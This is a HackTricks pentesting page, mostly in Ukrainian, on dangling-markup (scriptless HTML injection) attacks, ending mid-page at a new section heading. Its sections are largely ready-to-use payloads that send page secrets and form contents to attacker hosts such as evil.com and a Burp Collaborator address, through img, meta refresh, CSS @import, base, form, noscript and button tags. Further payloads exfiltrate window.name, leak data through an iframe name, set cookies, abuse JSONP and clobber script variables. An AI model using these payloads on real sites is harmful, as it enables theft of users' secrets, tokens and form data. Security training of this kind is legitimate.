# Dangling Markup - HTML scriptless injection

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## –†–µ–∑—é–º–µ

–¶—é —Ç–µ—Ö–Ω—ñ–∫—É –º–æ–∂–Ω–∞ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ –¥–ª—è –≤–∏—Ç—è–≥—É–≤–∞–Ω–Ω—è —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó –≤—ñ–¥ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞, –∫–æ–ª–∏ **–∑–Ω–∞–π–¥–µ–Ω–æ HTML-—ñ–Ω'—î–∫—Ü—ñ—é**. –¶–µ –¥—É–∂–µ –∫–æ—Ä–∏—Å–Ω–æ, —è–∫—â–æ –≤–∏ **–Ω–µ –∑–Ω–∞—Ö–æ–¥–∏—Ç–µ –∂–æ–¥–Ω–æ–≥–æ —Å–ø–æ—Å–æ–±—É –µ–∫—Å–ø–ª—É–∞—Ç—É–≤–∞—Ç–∏** [**XSS** ](../xss-cross-site-scripting/), –∞–ª–µ –º–æ–∂–µ—Ç–µ **–≤–ø—Ä–æ–≤–∞–¥–∏—Ç–∏ –¥–µ—è–∫—ñ HTML-—Ç–µ–≥–∏**.\
–¶–µ —Ç–∞–∫–æ–∂ –∫–æ—Ä–∏—Å–Ω–æ, —è–∫—â–æ –¥–µ—è–∫–∞ **—Å–µ–∫—Ä–µ—Ç–Ω–∞ —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—è –∑–±–µ—Ä—ñ–≥–∞—î—Ç—å—Å—è —É –≤—ñ–¥–∫—Ä–∏—Ç–æ–º—É —Ç–µ–∫—Å—Ç—ñ** –≤ HTML, —ñ –≤–∏ —Ö–æ—á–µ—Ç–µ **–µ–∫—Å—Ç—Ä–∞–∫—Ç—É–≤–∞—Ç–∏** —ó—ó –∑ –∫–ª—ñ—î–Ω—Ç–∞, –∞–±–æ —è–∫—â–æ –≤–∏ —Ö–æ—á–µ—Ç–µ –≤–≤–µ—Å—Ç–∏ –≤ –æ–º–∞–Ω—É –≤–∏–∫–æ–Ω–∞–Ω–Ω—è –¥–µ—è–∫–æ–≥–æ —Å–∫—Ä–∏–ø—Ç–∞.

–ö—ñ–ª—å–∫–∞ —Ç–µ—Ö–Ω—ñ–∫, –∑–≥–∞–¥–∞–Ω–∏—Ö —Ç—É—Ç, –º–æ–∂–Ω–∞ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ –¥–ª—è –æ–±—Ö–æ–¥—É –¥–µ—è–∫–æ—ó [**–ü–æ–ª—ñ—Ç–∏–∫–∏ –±–µ–∑–ø–µ–∫–∏ –∫–æ–Ω—Ç–µ–Ω—Ç—É**](../content-security-policy-csp-bypass/) —à–ª—è—Ö–æ–º –µ–∫—Å—Ç—Ä–∞–∫—Ü—ñ—ó —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó –Ω–µ—Å–ø–æ–¥—ñ–≤–∞–Ω–∏–º–∏ —Å–ø–æ—Å–æ–±–∞–º–∏ (HTML-—Ç–µ–≥–∏, CSS, http-–º–µ—Ç–∞-—Ç–µ–≥–∏, —Ñ–æ—Ä–º–∏, base...).

## –û—Å–Ω–æ–≤–Ω—ñ –∑–∞—Å—Ç–æ—Å—É–≤–∞–Ω–Ω—è

### –í–∫—Ä–∞–¥–∞–Ω–Ω—è —Å–µ–∫—Ä–µ—Ç—ñ–≤ —É –≤—ñ–¥–∫—Ä–∏—Ç–æ–º—É —Ç–µ–∫—Å—Ç—ñ

–Ø–∫—â–æ –≤–∏ –≤–ø—Ä–æ–≤–∞–¥–∏—Ç–µ `<img src='http://evil.com/log.cgi?` –ø—ñ–¥ —á–∞—Å –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è —Å—Ç–æ—Ä—ñ–Ω–∫–∏, –∂–µ—Ä—Ç–≤–∞ –Ω–∞–¥—ñ—à–ª–µ –≤–∞–º —É–≤–µ—Å—å –∫–æ–¥ –º—ñ–∂ –≤–ø—Ä–æ–≤–∞–¥–∂–µ–Ω–∏–º —Ç–µ–≥–æ–º `img` —ñ –Ω–∞—Å—Ç—É–ø–Ω–æ—é —Ü–∏—Ç–∞—Ç–æ—é –≤ –∫–æ–¥—ñ. –Ø–∫—â–æ —Å–µ–∫—Ä–µ—Ç —è–∫–∏–º–æ—Å—å —á–∏–Ω–æ–º –∑–Ω–∞—Ö–æ–¥–∏—Ç—å—Å—è –≤ —Ü—å–æ–º—É —Ñ—Ä–∞–≥–º–µ–Ω—Ç—ñ, –≤–∏ –π–æ–≥–æ –≤–∫—Ä–∞–¥–µ—Ç–µ (–≤–∏ –º–æ–∂–µ—Ç–µ –∑—Ä–æ–±–∏—Ç–∏ —Ç–µ –∂ —Å–∞–º–µ, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ –ø–æ–¥–≤—ñ–π–Ω—ñ –ª–∞–ø–∫–∏, –ø–æ–¥–∏–≤—ñ—Ç—å—Å—è, —â–æ –º–æ–∂–µ –±—É—Ç–∏ –±—ñ–ª—å—à —Ü—ñ–∫–∞–≤–∏–º –¥–ª—è –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è).

–Ø–∫—â–æ —Ç–µ–≥ `img` –∑–∞–±–æ—Ä–æ–Ω–µ–Ω–æ (–Ω–∞–ø—Ä–∏–∫–ª–∞–¥, —á–µ—Ä–µ–∑ CSP), –≤–∏ —Ç–∞–∫–æ–∂ –º–æ–∂–µ—Ç–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ `<meta http-equiv="refresh" content="4; URL='http://evil.com/log.cgi?`
```html
<img src='http://attacker.com/log.php?HTML=
<meta http-equiv="refresh" content='0; url=http://evil.com/log.php?text=
<meta http-equiv="refresh" content='0;URL=ftp://evil.com?a=
```
–ó–≤–µ—Ä–Ω—ñ—Ç—å —É–≤–∞–≥—É, —â–æ **Chrome –±–ª–æ–∫—É—î HTTP URL-–∞–¥—Ä–µ—Å–∏** –∑ "<" –∞–±–æ "\n" –≤ –Ω–∏—Ö, —Ç–æ–º—É –≤–∏ –º–æ–∂–µ—Ç–µ —Å–ø—Ä–æ–±—É–≤–∞—Ç–∏ —ñ–Ω—à—ñ –ø—Ä–æ—Ç–æ–∫–æ–ª—å–Ω—ñ —Å—Ö–µ–º–∏, —Ç–∞–∫—ñ —è–∫ "ftp".

–í–∏ —Ç–∞–∫–æ–∂ –º–æ–∂–µ—Ç–µ –∑–ª–æ–≤–∂–∏–≤–∞—Ç–∏ CSS `@import` (–Ω–∞–¥—ñ—à–ª–µ –≤–µ—Å—å –∫–æ–¥, –ø–æ–∫–∏ –Ω–µ –∑–Ω–∞–π–¥–µ ";")
```html
<style>@import//hackvertor.co.uk?     <--- Injected
<b>steal me!</b>;
```
–í–∏ —Ç–∞–∫–æ–∂ –º–æ–∂–µ—Ç–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ **`<table`**:
```html
<table background='//your-collaborator-id.burpcollaborator.net?'
```
–í–∏ —Ç–∞–∫–æ–∂ –º–æ–∂–µ—Ç–µ –≤—Å—Ç–∞–≤–∏—Ç–∏ —Ç–µ–≥ `<base`. –í—Å—è —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—è –±—É–¥–µ –Ω–∞–¥—ñ—Å–ª–∞–Ω–∞, –ø–æ–∫–∏ —Ü–∏—Ç–∞—Ç–∞ –Ω–µ –±—É–¥–µ –∑–∞–∫—Ä–∏—Ç–∞, –∞–ª–µ —Ü–µ –≤–∏–º–∞–≥–∞—î –¥–µ—è–∫–æ—ó –≤–∑–∞—î–º–æ–¥—ñ—ó –∑ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–µ–º (–∫–æ—Ä–∏—Å—Ç—É–≤–∞—á –ø–æ–≤–∏–Ω–µ–Ω –Ω–∞—Ç–∏—Å–Ω—É—Ç–∏ –Ω–∞ –¥–µ—è–∫–µ –ø–æ—Å–∏–ª–∞–Ω–Ω—è, –æ—Å–∫—ñ–ª—å–∫–∏ —Ç–µ–≥ base –∑–º—ñ–Ω–∏—Ç—å –¥–æ–º–µ–Ω, –Ω–∞ —è–∫–∏–π –≤–∫–∞–∑—É—î –ø–æ—Å–∏–ª–∞–Ω–Ω—è):
```html
<base target='        <--- Injected
steal me'<b>test</b>
```
### –í–∫—Ä–∞–¥–µ–Ω–Ω—è —Ñ–æ—Ä–º
```html
<base href='http://evil.com/'>
```
–¢–æ–¥—ñ —Ñ–æ—Ä–º–∏, —è–∫—ñ –Ω–∞–¥—Å–∏–ª–∞—é—Ç—å –¥–∞–Ω—ñ –Ω–∞ —à–ª—è—Ö (–Ω–∞–ø—Ä–∏–∫–ª–∞–¥, `<form action='update_profile.php'>`), –Ω–∞–¥—Å–∏–ª–∞—Ç–∏–º—É—Ç—å –¥–∞–Ω—ñ –Ω–∞ –∑–ª–æ–≤–º–∏—Å–Ω–∏–π –¥–æ–º–µ–Ω.

### Stealing forms 2

–í—Å—Ç–∞–Ω–æ–≤—ñ—Ç—å –∑–∞–≥–æ–ª–æ–≤–æ–∫ —Ñ–æ—Ä–º–∏: `<form action='http://evil.com/log_steal'>`, —Ü–µ –ø–µ—Ä–µ–∑–∞–ø–∏—à–µ –Ω–∞—Å—Ç—É–ø–Ω–∏–π –∑–∞–≥–æ–ª–æ–≤–æ–∫ —Ñ–æ—Ä–º–∏, —ñ –≤—Å—ñ –¥–∞–Ω—ñ –∑ —Ñ–æ—Ä–º–∏ –±—É–¥—É—Ç—å –Ω–∞–¥—ñ—Å–ª–∞–Ω—ñ –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫—É.

### Stealing forms 3

–ö–Ω–æ–ø–∫–∞ –º–æ–∂–µ –∑–º—ñ–Ω–∏—Ç–∏ URL, –∫—É–¥–∏ –±—É–¥–µ –Ω–∞–¥—ñ—Å–ª–∞–Ω–∞ —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—è –∑ —Ñ–æ—Ä–º–∏, –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é –∞—Ç—Ä–∏–±—É—Ç–∞ "formaction":
```html
<button name=xss type=submit formaction='https://google.com'>I get consumed!
```
–ó–ª–æ–≤–º–∏—Å–Ω–∏–∫ –º–æ–∂–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ —Ü–µ –¥–ª—è –∫—Ä–∞–¥—ñ–∂–∫–∏ —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó.

–ó–Ω–∞–π–¥—ñ—Ç—å [**–ø—Ä–∏–∫–ª–∞–¥ —Ü—ñ—î—ó –∞—Ç–∞–∫–∏ –≤ —Ü—å–æ–º—É –∑–≤—ñ—Ç—ñ**](https://portswigger.net/research/stealing-passwords-from-infosec-mastodon-without-bypassing-csp).

### –ö—Ä–∞–¥—ñ–∂–∫–∞ –≤—ñ–¥–∫—Ä–∏—Ç–∏—Ö —Å–µ–∫—Ä–µ—Ç—ñ–≤ 2

–í–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ –æ—Å—Ç–∞–Ω–Ω—å–æ –∑–≥–∞–¥–∞–Ω—É —Ç–µ—Ö–Ω—ñ–∫—É –¥–ª—è –∫—Ä–∞–¥—ñ–∂–∫–∏ —Ñ–æ—Ä–º (–≤–ø—Ä–æ–≤–∞–¥–∂–µ–Ω–Ω—è –Ω–æ–≤–æ–≥–æ –∑–∞–≥–æ–ª–æ–≤–∫–∞ —Ñ–æ—Ä–º–∏), –≤–∏ –º–æ–∂–µ—Ç–µ –ø–æ—Ç—ñ–º –≤–ø—Ä–æ–≤–∞–¥–∏—Ç–∏ –Ω–æ–≤–µ –ø–æ–ª–µ –≤–≤–µ–¥–µ–Ω–Ω—è:
```html
<input type='hidden' name='review_body' value="
```
—ñ —Ü–µ –ø–æ–ª–µ –≤–≤–µ–¥–µ–Ω–Ω—è –º—ñ—Å—Ç–∏—Ç–∏–º–µ –≤–µ—Å—å –≤–º—ñ—Å—Ç –º—ñ–∂ –π–æ–≥–æ –ø–æ–¥–≤—ñ–π–Ω–∏–º–∏ –ª–∞–ø–∫–∞–º–∏ —Ç–∞ –Ω–∞—Å—Ç—É–ø–Ω–∏–º–∏ –ø–æ–¥–≤—ñ–π–Ω–∏–º–∏ –ª–∞–ø–∫–∞–º–∏ –≤ HTML. –¶—è –∞—Ç–∞–∫–∞ –ø–æ—î–¥–Ω—É—î "_**Stealing clear text secrets**_" –∑ "_**Stealing forms2**_".

–í–∏ –º–æ–∂–µ—Ç–µ –∑—Ä–æ–±–∏—Ç–∏ —Ç–µ –∂ —Å–∞–º–µ, —ñ–Ω–∂–µ–∫—Ç—É—é—á–∏ —Ñ–æ—Ä–º—É —Ç–∞ —Ç–µ–≥ `<option>`. –£—Å—ñ –¥–∞–Ω—ñ –¥–æ –∑–∞–∫—Ä–∏—Ç–æ–≥–æ `</option>` –±—É–¥—É—Ç—å –Ω–∞–¥—ñ—Å–ª–∞–Ω—ñ:
```html
<form action=http://google.com><input type="submit">Click Me</input><select name=xss><option
```
### –í–ø—Ä–æ–≤–∞–¥–∂–µ–Ω–Ω—è –ø–∞—Ä–∞–º–µ—Ç—Ä—ñ–≤ —Ñ–æ—Ä–º–∏

–í–∏ –º–æ–∂–µ—Ç–µ –∑–º—ñ–Ω–∏—Ç–∏ —à–ª—è—Ö —Ñ–æ—Ä–º–∏ —Ç–∞ –≤—Å—Ç–∞–≤–∏—Ç–∏ –Ω–æ–≤—ñ –∑–Ω–∞—á–µ–Ω–Ω—è, —â–æ–± –≤–∏–∫–æ–Ω–∞—Ç–∏ –Ω–µ—Å–ø–æ–¥—ñ–≤–∞–Ω—É –¥—ñ—é:
```html
<form action='/change_settings.php'>
<input type='hidden' name='invite_user'
value='fredmbogo'>                                        ‚Üê Injected lines

<form action="/change_settings.php">                        ‚Üê Existing form (ignored by the parser)
...
<input type="text" name="invite_user" value="">             ‚Üê Subverted field
...
<input type="hidden" name="xsrf_token" value="12345">
...
</form>
```
### –í–∏–∫—Ä–∞–¥–µ–Ω–Ω—è —Å–µ–∫—Ä–µ—Ç—ñ–≤ —É –≤—ñ–¥–∫—Ä–∏—Ç–æ–º—É —Ç–µ–∫—Å—Ç—ñ —á–µ—Ä–µ–∑ noscript

`<noscript></noscript>` –¶–µ —Ç–µ–≥, –≤–º—ñ—Å—Ç —è–∫–æ–≥–æ –±—É–¥–µ —ñ–Ω—Ç–µ—Ä–ø—Ä–µ—Ç–æ–≤–∞–Ω–æ, —è–∫—â–æ –±—Ä–∞—É–∑–µ—Ä –Ω–µ –ø—ñ–¥—Ç—Ä–∏–º—É—î javascript (–≤–∏ –º–æ–∂–µ—Ç–µ —É–≤—ñ–º–∫–Ω—É—Ç–∏/–≤–∏–º–∫–Ω—É—Ç–∏ Javascript —É Chrome –∑–∞ –∞–¥—Ä–µ—Å–æ—é [chrome://settings/content/javascript](chrome://settings/content/javascript)).

–°–ø–æ—Å—ñ–± –µ–∫—Å—Ñ—ñ–ª—å—Ç—Ä–∞—Ü—ñ—ó –≤–º—ñ—Å—Ç—É –≤–µ–±-—Å—Ç–æ—Ä—ñ–Ω–∫–∏ –∑ —Ç–æ—á–∫–∏ —ñ–Ω'—î–∫—Ü—ñ—ó –¥–æ–Ω–∏–∑—É –Ω–∞ —Å–∞–π—Ç, –∫–æ–Ω—Ç—Ä–æ–ª—å–æ–≤–∞–Ω–∏–π –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫–æ–º, –±—É–¥–µ —ñ–Ω'—î–∫—Ü—ñ—è —Ü—å–æ–≥–æ:
```html
<noscript><form action=http://evil.com><input type=submit style="position:absolute;left:0;top:0;width:100%;height:100%;" type=submit value=""><textarea name=contents></noscript>
```
### –û–±—Ö—ñ–¥ CSP –∑ –≤–∑–∞—î–º–æ–¥—ñ—î—é –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞

–ó —Ü—å–æ–≥–æ [–¥–æ—Å–ª—ñ–¥–∂–µ–Ω–Ω—è portswiggers](https://portswigger.net/research/evading-csp-with-dom-based-dangling-markup) –≤–∏ –º–æ–∂–µ—Ç–µ –¥—ñ–∑–Ω–∞—Ç–∏—Å—è, —â–æ –Ω–∞–≤—ñ—Ç—å –∑ **–Ω–∞–π–±—ñ–ª—å—à –æ–±–º–µ–∂–µ–Ω–∏—Ö** —Å–µ—Ä–µ–¥–æ–≤–∏—â CSP –≤–∏ –≤—Å–µ —â–µ –º–æ–∂–µ—Ç–µ **–µ–∫—Å—Ç—Ä–∞–≥—É–≤–∞—Ç–∏ –¥–∞–Ω—ñ** –∑ –¥–µ—è–∫–æ—é **–≤–∑–∞—î–º–æ–¥—ñ—î—é –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞**. –£ —Ü—å–æ–º—É –≤–∏–ø–∞–¥–∫—É –º–∏ –±—É–¥–µ–º–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ –∫–æ—Ä–∏—Å–Ω–µ –Ω–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è:
```html
<a href=http://attacker.net/payload.html><font size=100 color=red>You must click me</font></a>
<base target='
```
–ó–≤–µ—Ä–Ω—ñ—Ç—å —É–≤–∞–≥—É, —â–æ –≤–∏ –ø–æ–ø—Ä–æ—Å–∏—Ç–µ **–∂–µ—Ä—Ç–≤—É** **–Ω–∞—Ç–∏—Å–Ω—É—Ç–∏ –Ω–∞ –ø–æ—Å–∏–ª–∞–Ω–Ω—è**, —è–∫–µ **–ø–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–∏—Ç—å** –π–æ–≥–æ –Ω–∞ **payload**, –∫–æ–Ω—Ç—Ä–æ–ª—å–æ–≤–∞–Ω–∏–π –≤–∞–º–∏. –¢–∞–∫–æ–∂ –∑–≤–µ—Ä–Ω—ñ—Ç—å —É–≤–∞–≥—É, —â–æ –∞—Ç—Ä–∏–±—É—Ç **`target`** –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ —Ç–µ–≥—É **`base`** –º—ñ—Å—Ç–∏—Ç–∏–º–µ **HTML –∫–æ–Ω—Ç–µ–Ω—Ç** –¥–æ –Ω–∞—Å—Ç—É–ø–Ω–æ—ó –æ–¥–∏–Ω–∞—Ä–Ω–æ—ó –ª–∞–ø–∫–∏.\
–¶–µ –ø—Ä–∏–∑–≤–µ–¥–µ –¥–æ —Ç–æ–≥–æ, —â–æ **–∑–Ω–∞—á–µ–Ω–Ω—è** **`window.name`** –ø—Ä–∏ –Ω–∞—Ç–∏—Å–∫–∞–Ω–Ω—ñ –Ω–∞ –ø–æ—Å–∏–ª–∞–Ω–Ω—è –±—É–¥–µ –≤—Å—ñ–º —Ü–∏–º **HTML –∫–æ–Ω—Ç–µ–Ω—Ç–æ–º**. –¢–æ–º—É, –æ—Å–∫—ñ–ª—å–∫–∏ –≤–∏ **–∫–æ–Ω—Ç—Ä–æ–ª—é—î—Ç–µ —Å—Ç–æ—Ä—ñ–Ω–∫—É**, –Ω–∞ —è–∫—É –∂–µ—Ä—Ç–≤–∞ –ø–µ—Ä–µ—Ö–æ–¥–∏—Ç—å, –Ω–∞—Ç–∏—Å–∫–∞—é—á–∏ –Ω–∞ –ø–æ—Å–∏–ª–∞–Ω–Ω—è, –≤–∏ –º–æ–∂–µ—Ç–µ –æ—Ç—Ä–∏–º–∞—Ç–∏ –¥–æ—Å—Ç—É–ø –¥–æ —Ü—å–æ–≥–æ **`window.name`** —ñ **exfiltrate** —Ü—ñ –¥–∞–Ω—ñ:
```html
<script>
if(window.name) {
new Image().src='//your-collaborator-id.burpcollaborator.net?'+encodeURIComponent(window.name);
</script>
```
### Misleading script workflow 1 - HTML namespace attack

–í—Å—Ç–∞–≤—Ç–µ –Ω–æ–≤–∏–π —Ç–µ–≥ –∑ id –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ HTML, —è–∫–∏–π –ø–µ—Ä–µ–∑–∞–ø–∏—à–µ –Ω–∞—Å—Ç—É–ø–Ω–∏–π, —ñ –∑ –∑–Ω–∞—á–µ–Ω–Ω—è–º, —è–∫–µ –≤–ø–ª–∏–Ω–µ –Ω–∞ –ø–æ—Ç—ñ–∫ —Å–∫—Ä–∏–ø—Ç–∞. –£ —Ü—å–æ–º—É –ø—Ä–∏–∫–ª–∞–¥—ñ –≤–∏ –≤–∏–±–∏—Ä–∞—î—Ç–µ, –∑ –∫–∏–º –±—É–¥–µ –ø–æ–¥—ñ–ª–µ–Ω–æ —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—é:
```html
<input type='hidden' id='share_with' value='fredmbogo'>     ‚Üê Injected markup
...
Share this status update with:                              ‚Üê Legitimate optional element of a dialog
<input id='share_with' value=''>

...

function submit_status_update() {
...
request.share_with = document.getElementById('share_with').value;
...
}
```
### Misleading script workflow 2 - Script namespace attack

–°—Ç–≤–æ—Ä—ñ—Ç—å –∑–º—ñ–Ω–Ω—ñ –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ –ø—Ä–æ—Å—Ç–æ—Ä—É —ñ–º–µ–Ω javascript, –≤—Å—Ç–∞–≤–ª—è—é—á–∏ HTML-—Ç–µ–≥–∏. –ü–æ—Ç—ñ–º —Ü—è –∑–º—ñ–Ω–Ω–∞ –≤–ø–ª–∏–Ω–µ –Ω–∞ –ø–æ—Ç—ñ–∫ –ø—Ä–æ–≥—Ä–∞–º–∏:
```html
<img id='is_public'>                                        ‚Üê Injected markup

...

// Legitimate application code follows

function retrieve_acls() {
...
if (response.access_mode == AM_PUBLIC)                    ‚Üê The subsequent assignment fails in IE
is_public = true;
else
is_public = false;
}

function submit_new_acls() {
...
if (is_public) request.access_mode = AM_PUBLIC;           ‚Üê Condition always evaluates to true
...
}
```
### –ó–ª–æ–≤–∂–∏–≤–∞–Ω–Ω—è JSONP

–Ø–∫—â–æ –≤–∏ –∑–Ω–∞–π–¥–µ—Ç–µ —ñ–Ω—Ç–µ—Ä—Ñ–µ–π—Å JSONP, –≤–∏ –∑–º–æ–∂–µ—Ç–µ –≤–∏–∫–ª–∏–∫–∞—Ç–∏ –¥–æ–≤—ñ–ª—å–Ω—É —Ñ—É–Ω–∫—Ü—ñ—é –∑ –¥–æ–≤—ñ–ª—å–Ω–∏–º–∏ –¥–∞–Ω–∏–º–∏:
```html
<script src='/editor/sharing.js'>:              ‚Üê Legitimate script
function set_sharing(public) {
if (public) request.access_mode = AM_PUBLIC;
else request.access_mode = AM_PRIVATE;
...
}

<script src='/search?q=a&call=set_sharing'>:    ‚Üê Injected JSONP call
set_sharing({ ... })
```
–ê–±–æ –≤–∏ –º–æ–∂–µ—Ç–µ –Ω–∞–≤—ñ—Ç—å —Å–ø—Ä–æ–±—É–≤–∞—Ç–∏ –≤–∏–∫–æ–Ω–∞—Ç–∏ –¥–µ—è–∫–∏–π javascript:
```html
<script src='/search?q=a&call=alert(1)'></script>
```
### –ó–ª–æ–≤–∂–∏–≤–∞–Ω–Ω—è Iframe

–î–æ—á—ñ—Ä–Ω—ñ–π –¥–æ–∫—É–º–µ–Ω—Ç –º–∞—î –º–æ–∂–ª–∏–≤—ñ—Å—Ç—å –ø–µ—Ä–µ–≥–ª—è–¥–∞—Ç–∏ —Ç–∞ –∑–º—ñ–Ω—é–≤–∞—Ç–∏ –≤–ª–∞—Å—Ç–∏–≤—ñ—Å—Ç—å `location` —Å–≤–æ–≥–æ –±–∞—Ç—å–∫–∞, –Ω–∞–≤—ñ—Ç—å —É —Å–∏—Ç—É–∞—Ü—ñ—è—Ö –∑ —Ä—ñ–∑–Ω–∏–º–∏ –¥–∂–µ—Ä–µ–ª–∞–º–∏. –¶–µ –¥–æ–∑–≤–æ–ª—è—î –≤–±—É–¥–æ–≤—É–≤–∞—Ç–∏ —Å–∫—Ä–∏–ø—Ç —É **iframe**, —è–∫–∏–π –º–æ–∂–µ –ø–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–∏—Ç–∏ –∫–ª—ñ—î–Ω—Ç–∞ –Ω–∞ –¥–æ–≤—ñ–ª—å–Ω—É —Å—Ç–æ—Ä—ñ–Ω–∫—É:
```html
<html><head></head><body><script>top.window.location = "https://attacker.com/hacked.html"</script></body></html>
```
–¶–µ –º–æ–∂–Ω–∞ –ø–æ–º'—è–∫—à–∏—Ç–∏ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é —á–æ–≥–æ—Å—å –Ω–∞ –∑—Ä–∞–∑–æ–∫: `sandbox=' allow-scripts allow-top-navigation'`

Iframe —Ç–∞–∫–æ–∂ –º–æ–∂–µ –±—É—Ç–∏ –∑–ª–æ–≤–∂–∏—Ç–æ –¥–ª—è –≤–∏—Ç–æ–∫—É —á—É—Ç–ª–∏–≤–æ—ó —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó –∑ —ñ–Ω—à–æ—ó —Å—Ç–æ—Ä—ñ–Ω–∫–∏ **–≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ –∞—Ç—Ä–∏–±—É—Ç —ñ–º–µ–Ω—ñ iframe**. –¶–µ –ø–æ–≤'—è–∑–∞–Ω–æ –∑ —Ç–∏–º, —â–æ –≤–∏ –º–æ–∂–µ—Ç–µ —Å—Ç–≤–æ—Ä–∏—Ç–∏ iframe, —è–∫–∏–π –≤–±—É–¥–æ–≤—É—î —Å–∞–º —Å–µ–±–µ, –∑–ª–æ–≤–∂–∏–≤–∞—é—á–∏ HTML-—ñ–Ω'—î–∫—Ü—ñ—î—é, —â–æ —Ä–æ–±–∏—Ç—å **—á—É—Ç–ª–∏–≤—É —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—é –≤–∏–¥–∏–º–æ—é –≤ –∞—Ç—Ä–∏–±—É—Ç—ñ —ñ–º–µ–Ω—ñ iframe**, –∞ –ø–æ—Ç—ñ–º –æ—Ç—Ä–∏–º–∞—Ç–∏ —Ü–µ —ñ–º'—è –∑ –ø–æ—á–∞—Ç–∫–æ–≤–æ–≥–æ iframe —ñ –≤–∏—Ç—ñ–∫–∞—Ç–∏ –π–æ–≥–æ.
```html
<script>
function cspBypass(win) {
win[0].location = 'about:blank';
setTimeout(()=>alert(win[0].name), 500);
}
</script>

<iframe src="//subdomain1.portswigger-labs.net/bypassing-csp-with-dangling-iframes/target.php?email=%22><iframe name=%27" onload="cspBypass(this.contentWindow)"></iframe>
```
–î–ª—è –æ—Ç—Ä–∏–º–∞–Ω–Ω—è –¥–æ–¥–∞—Ç–∫–æ–≤–æ—ó —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó –ø–µ—Ä–µ–≥–ª—è–Ω—å—Ç–µ [https://portswigger.net/research/bypassing-csp-with-dangling-iframes](https://portswigger.net/research/bypassing-csp-with-dangling-iframes)

### \<meta –∑–ª–æ–≤–∂–∏–≤–∞–Ω–Ω—è

–í–∏ –º–æ–∂–µ—Ç–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ **`meta http-equiv`** –¥–ª—è –≤–∏–∫–æ–Ω–∞–Ω–Ω—è **–∫—ñ–ª—å–∫–æ—Ö –¥—ñ–π**, —Ç–∞–∫–∏—Ö —è–∫ –≤—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–Ω—è Cookie: `<meta http-equiv="Set-Cookie" Content="SESSID=1">` –∞–±–æ –≤–∏–∫–æ–Ω–∞–Ω–Ω—è –ø–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª–µ–Ω–Ω—è (—á–µ—Ä–µ–∑ 5 —Å–µ–∫—É–Ω–¥ —É —Ü—å–æ–º—É –≤–∏–ø–∞–¥–∫—É): `<meta name="language" content="5;http://attacker.svg" HTTP-EQUIV="refresh" />`

–¶–µ –º–æ–∂–Ω–∞ **—É–Ω–∏–∫–Ω—É—Ç–∏** –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é **CSP** —â–æ–¥–æ **http-equiv** ( `Content-Security-Policy: default-src 'self';`, –∞–±–æ `Content-Security-Policy: http-equiv 'self';`)

### –ù–æ–≤–∏–π \<portal HTML —Ç–µ–≥

